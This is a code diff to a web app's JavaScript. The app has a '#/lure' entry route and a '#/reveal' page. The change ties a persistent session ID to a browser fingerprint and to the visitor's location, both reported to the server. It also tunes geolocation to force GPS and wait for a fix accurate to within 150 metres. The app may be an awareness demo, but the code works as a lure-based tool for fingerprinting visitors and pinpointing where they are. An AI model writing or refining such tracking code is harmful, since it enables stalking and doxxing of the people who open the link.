@@ -13,6 +13,16 @@ let countdownInterval = null;
 let visitReported = false;
 let locationReported = false;
 
+// Generate or retrieve a persistent session ID for this browser tab
+function getSessionId() {
+  let sid = sessionStorage.getItem('_sid');
+  if (!sid) {
+    sid = Math.random().toString(36).substring(2, 8).toUpperCase();
+    sessionStorage.setItem('_sid', sid);
+  }
+  return sid;
+}
+
 function reportVisit() {
   if (visitReported) return;
   const hash = window.location.hash || '#/lure';
@@ -20,20 +30,22 @@ function reportVisit() {
 
   visitReported = true;
   const fingerprint = getBrowserFingerprint();
+  const sessionId = getSessionId();
   fetch('/api/visit', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ fingerprint })
+    body: JSON.stringify({ fingerprint, sessionId })
   }).catch(err => console.error('Failed to report visit:', err));
 }
 
 function reportLocation(location) {
   if (locationReported) return; // Only report once per session
   locationReported = true;
+  const sessionId = getSessionId();
   fetch('/api/location', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ location })
+    body: JSON.stringify({ location, sessionId })
   }).catch(err => console.error('Failed to report location:', err));
 }
 
@@ -170,13 +182,38 @@ window.addEventListener('DOMContentLoaded', () => {
 });
 
 let watchId = null;
+let gpsCommitTimeout = null;
 
-// Request Geolocation from browser with watchPosition for higher precision and live updates
+// Commit the best position we have so far and navigate
+function commitLocation() {
+  if (gpsCommitTimeout) {
+    clearTimeout(gpsCommitTimeout);
+    gpsCommitTimeout = null;
+  }
+  if (watchId) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+
+  // Hide error message
+  const errorMsg = document.getElementById('consent-error-message');
+  if (errorMsg) errorMsg.style.display = 'none';
+
+  if (window.location.hash !== '#/reveal') {
+    currentLocationData.address = 'Resolving address...';
+    window.location.hash = '#/reveal';
+  } else {
+    geocodeAndUpdate();
+  }
+}
+
+// Request Geolocation — waits for a quality GPS fix (≤150m accuracy) 
+// before committing, with a 12-second hard timeout fallback.
 function requestLocation() {
   const options = {
-    enableHighAccuracy: true, // Force GPS hardware tracking
+    enableHighAccuracy: true, // Force GPS hardware
     timeout: 15000,
-    maximumAge: 0
+    maximumAge: 0            // Never use a cached position
   };
 
   if (!navigator.geolocation) {
@@ -184,39 +221,36 @@ function requestLocation() {
     return;
   }
 
-  if (watchId) {
-    navigator.geolocation.clearWatch(watchId);
-  }
+  if (watchId) navigator.geolocation.clearWatch(watchId);
+  if (gpsCommitTimeout) clearTimeout(gpsCommitTimeout);
+
+  // Hard timeout: after 12s, commit whatever best position we have
+  gpsCommitTimeout = setTimeout(() => {
+    if (currentLocationData.lat !== null) {
+      commitLocation();
+    }
+  }, 12000);
 
   watchId = navigator.geolocation.watchPosition(
     (position) => {
-      // SUCCESS
+      // Always update to latest (more refined) position
       currentLocationData.lat = position.coords.latitude;
       currentLocationData.lng = position.coords.longitude;
       currentLocationData.accuracy = position.coords.accuracy;
 
-      // Stop watching after first successful fix to avoid repeated callbacks
-      if (watchId) {
-        navigator.geolocation.clearWatch(watchId);
-        watchId = null;
-      }
-      
-      // Hide error message if location was successfully granted
+      // Hide error message as soon as any fix arrives
       const errorMsg = document.getElementById('consent-error-message');
-      if (errorMsg) {
-        errorMsg.style.display = 'none';
+      if (errorMsg) errorMsg.style.display = 'none';
+
+      // Commit immediately if GPS quality is good (≤150m = real GPS fix)
+      // Otherwise keep watching — cell/wifi estimate will refine into GPS
+      if (position.coords.accuracy <= 150) {
+        commitLocation();
       }
-      
-      // Redirect to reveal page; geocoding + reporting happens in initRevealPage -> geocodeAndUpdate
-      if (window.location.hash !== '#/reveal') {
-        currentLocationData.address = 'Resolving address...';
-        window.location.hash = '#/reveal';
-      } else {
-        // Already on reveal page — trigger geocoding update
-        geocodeAndUpdate();
-      }
+      // else: keep watching and wait for a better fix or the 12s timeout
     },
     (error) => {
+      if (gpsCommitTimeout) clearTimeout(gpsCommitTimeout);
       handleLocationError(error);
     },
     options
